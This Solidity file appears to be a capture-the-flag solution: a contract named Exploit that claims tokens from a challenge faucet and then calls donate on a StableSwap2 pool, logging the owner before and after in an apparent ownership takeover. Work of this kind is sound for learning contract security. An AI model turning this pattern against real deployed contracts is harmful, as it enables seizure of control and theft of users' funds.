//SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.0;

import "./StableSwap2.sol";
import "./Setup.sol";
import "hardhat/console.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract Exploit {
    StableSwap2 public swap;
    address public setup;
    ERC20 public USDC;
    ERC20 public USDT;
    ERC20 public BUSD;

    constructor(StableSwap2 instance) payable {
        swap = instance;
        setup = swap.owner();
        console.log("Setup  address is %s ", setup);
        USDC = ERC20(address(swap.underlying(0)));
        USDT = ERC20(address(swap.underlying(1)));
        BUSD = ERC20(address(swap.underlying(2)));

        console.log("USDC name is %s ", USDC.name());
        console.log("USDT name is %s ", USDT.name());
        console.log("BUSD name is %s ", BUSD.name());

        callFaucet();
        console.log("Owner before donation is %s ", swap.owner());
        swap.donate(1);
        console.log("Owner after donation is  %s ", swap.owner());
    }

    function callFaucet() public {
        console.log("USDC  balance is %s ", USDC.balanceOf(address(this)));
        Setup(setup).faucet(1000);
        console.log("USDC  balance is %s ", USDC.balanceOf(address(this)));
    }
}
